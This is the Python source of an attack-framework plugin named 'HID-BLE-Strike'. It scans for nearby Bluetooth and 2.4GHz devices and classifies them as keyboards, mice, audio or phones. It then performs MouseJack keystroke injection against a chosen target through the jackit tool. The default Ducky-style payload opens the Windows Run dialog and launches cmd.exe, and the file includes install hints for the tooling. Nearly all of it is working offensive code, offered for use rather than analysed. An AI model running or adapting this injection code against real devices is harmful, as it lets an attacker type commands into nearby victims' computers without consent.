import asyncio
import re
import subprocess
from core.plugin_manager import BasePlugin


def _classify(name: str) -> str:
    n = name.lower()
    if any(k in n for k in ['mouse', 'keyboard', 'kb', 'logitech', 'mx ', 'k380', 'k780', 'pebble', 'hid', 'unifying']):
        return 'HID'
    if any(k in n for k in ['headphone', 'speaker', 'earbuds', 'airpod', 'bud', 'audio', 'sound']):
        return 'AUDIO'
    if any(k in n for k in ['phone', 'iphone', 'android', 'pixel', 'galaxy', 'oneplus']):
        return 'MOBILE'
    return 'BLE'


class HIDBLEPlugin(BasePlugin):
    def __init__(self):
        self.running = False
        self.discovered_devices: list[dict] = []

    @property
    def name(self) -> str:
        return "HID-BLE-Strike"

    @property
    def description(self) -> str:
        return "Tactical BLE Recon & HID MouseJacking"

    @property
    def version(self) -> str:
        return "1.5.0"

    @property
    def category(self) -> str:
        return "wireless"

    async def start(self):
        self.running = True

    async def stop(self):
        self.running = False

    async def scan_ble(self) -> list[dict]:
        """Enumerate nearby BLE/2.4GHz devices via hcitool or bluetoothctl."""
        devices: dict[str, dict] = {}

        # --- Strategy 1: hcitool lescan (fastest, needs root) ---
        try:
            proc = await asyncio.create_subprocess_exec(
                'timeout', '5', 'hcitool', 'lescan', '--duplicates',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=8)
            for line in stdout.decode('utf-8', errors='ignore').splitlines():
                m = re.match(r'([0-9A-Fa-f:]{17})\s+(.*)', line.strip())
                if m:
                    mac = m.group(1).upper()
                    name = m.group(2).strip()
                    if mac == '00:00:00:00:00:00':
                        continue
                    if mac not in devices:
                        label = name if name and name not in ('(unknown)', '') else f'BLE-{mac[-5:]}'
                        devices[mac] = {'mac': mac, 'name': label, 'type': _classify(label)}
        except (FileNotFoundError, asyncio.TimeoutError):
            pass

        # --- Strategy 2: bluetoothctl (fallback, no root needed for scan) ---
        if not devices:
            try:
                proc = await asyncio.create_subprocess_exec(
                    'bluetoothctl',
                    stdin=asyncio.subprocess.PIPE,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                # Power on, scan, wait, list, quit
                cmds = b'power on\nscan on\n'
                proc.stdin.write(cmds)
                await proc.stdin.drain()
                await asyncio.sleep(5)
                proc.stdin.write(b'devices\nquit\n')
                await proc.stdin.drain()
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
                for line in stdout.decode('utf-8', errors='ignore').splitlines():
                    m = re.match(r'Device\s+([0-9A-Fa-f:]{17})\s+(.*)', line.strip())
                    if m:
                        mac = m.group(1).upper()
                        name = m.group(2).strip()
                        if mac not in devices:
                            label = name or f'BLE-{mac[-5:]}'
                            devices[mac] = {'mac': mac, 'name': label, 'type': _classify(label)}
            except (FileNotFoundError, asyncio.TimeoutError):
                pass

        # --- Strategy 3: parse hci0 cache from /var/lib/bluetooth ---
        if not devices:
            try:
                result = subprocess.run(
                    ['find', '/var/lib/bluetooth', '-name', 'info', '-readable'],
                    capture_output=True, text=True, timeout=3
                )
                for info_path in result.stdout.splitlines():
                    mac = info_path.split('/')[-2].replace('_', ':').upper()
                    name = ''
                    try:
                        with open(info_path) as f:
                            for l in f:
                                if l.startswith('Name='):
                                    name = l.split('=', 1)[1].strip()
                                    break
                    except Exception:
                        pass
                    label = name or f'BLE-{mac[-5:]}'
                    devices[mac] = {'mac': mac, 'name': label, 'type': _classify(label)}
            except Exception:
                pass

        self.discovered_devices = list(devices.values())
        return self.discovered_devices

    async def mousejack_inject(self, target_mac: str, payload: str = "GUI r\nDELAY 500\nSTRING cmd.exe\nENTER") -> dict:
        """
        Inject HID keystrokes via MouseJack (jackit) or nRF51 dongle.
        Requires: pip install jackit  OR  jackit binary in PATH.
        """
        try:
            # Convert Ducky-script payload to jackit format
            keys = []
            for line in payload.splitlines():
                line = line.strip()
                if not line:
                    continue
                upper = line.upper()
                if upper.startswith('STRING '):
                    keys.append(line[7:])
                elif upper.startswith('DELAY '):
                    keys.append(f'DELAY {line[6:].strip()}')
                elif upper.startswith('GUI ') or upper.startswith('WINDOWS '):
                    rest = line.split(None, 1)[1].upper() if ' ' in line else ''
                    keys.append(f'WIN+{rest}' if rest else 'WIN')
                elif upper in ('ENTER', 'RETURN'):
                    keys.append('RETURN')
                elif upper in ('TAB', 'ESCAPE', 'SPACE', 'BACKSPACE'):
                    keys.append(upper)
                else:
                    keys.append(line)

            proc = await asyncio.create_subprocess_exec(
                'jackit',
                '--target', target_mac,
                '--attack', 'keystroke',
                '--payload', '\n'.join(keys),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=20)
            out = stdout.decode('utf-8', errors='ignore')
            err = stderr.decode('utf-8', errors='ignore')
            success = proc.returncode == 0 or any(k in out.lower() for k in ('success', 'inject', 'transmit'))
            return {
                'status': 'DELIVERED' if success else 'FAILED',
                'target': target_mac,
                'output': (out + err)[:300].strip(),
            }

        except FileNotFoundError:
            return {
                'status': 'TOOL_MISSING',
                'target': target_mac,
                'note': 'Install MouseJack tooling: pip install jackit',
            }
        except asyncio.TimeoutError:
            return {'status': 'TIMEOUT', 'target': target_mac}
        except Exception as e:
            return {'status': 'ERROR', 'target': target_mac, 'error': str(e)}
